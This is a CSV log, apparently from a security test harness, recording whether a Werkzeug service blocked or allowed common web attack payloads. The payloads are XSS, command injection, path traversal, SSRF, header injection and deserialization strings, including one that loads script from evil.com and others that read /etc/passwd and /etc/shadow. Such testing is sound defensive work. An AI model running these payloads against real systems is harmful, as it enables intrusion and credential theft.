timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,http_handler,response_body
2025-10-13T14:41:56.931865,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.040479,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-13T14:41:57.047108,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-13T14:41:57.152919,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-13T14:41:57.159239,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-13T14:41:57.268316,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.274667,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.381943,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.387506,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.492905,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.499346,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.605452,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-13T14:41:57.611867,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-13T14:41:57.720728,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.727087,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.836033,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.842463,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.951447,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:57.958381,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.063980,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.070576,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.179963,Cmd Injection,Simple Pipe,| whoami,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.186368,Cmd Injection,Simple Pipe,| whoami,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.295442,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T14:41:58.301636,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T14:41:58.409869,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T14:41:58.416253,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T14:41:58.525193,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.531975,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.637533,Cmd Injection,Backticks,`uname -a`,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T14:41:58.644406,Cmd Injection,Backticks,`uname -a`,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T14:41:58.753412,Cmd Injection,Command Substitution,$(reboot),Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.760177,Cmd Injection,Command Substitution,$(reboot),Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.864990,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.871611,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:58.980356,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T14:41:58.987071,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T14:41:59.096111,Path Traversal,Root Directory,/etc/shadow,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.102517,Path Traversal,Root Directory,/etc/shadow,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.207552,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.213222,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.322227,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.328410,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.436916,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.443392,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.552607,Path Traversal,Null Byte,../../etc/passwd%00,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T14:41:59.559335,Path Traversal,Null Byte,../../etc/passwd%00,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T14:41:59.668283,SSRF,Localhost,http://localhost/admin,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.674713,SSRF,Localhost,http://localhost/admin,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.783884,SSRF,127.0.0.1,http://127.0.0.1:8080,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.790039,SSRF,127.0.0.1,http://127.0.0.1:8080,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.898778,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:41:59.905584,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.014941,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.020467,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.128328,SSRF,Internal IP,http://10.0.0.1/,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.134633,SSRF,Internal IP,http://10.0.0.1/,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.243858,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.247083,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.354223,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.360989,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.466737,Deserialization,Java RMI Header,JRMI,Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.474201,Deserialization,Java RMI Header,JRMI,Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.583376,Deserialization,Python Pickle,"cposix
system
",Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.589969,Deserialization,Python Pickle,"cposix
system
",Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.694782,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T14:42:00.701405,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
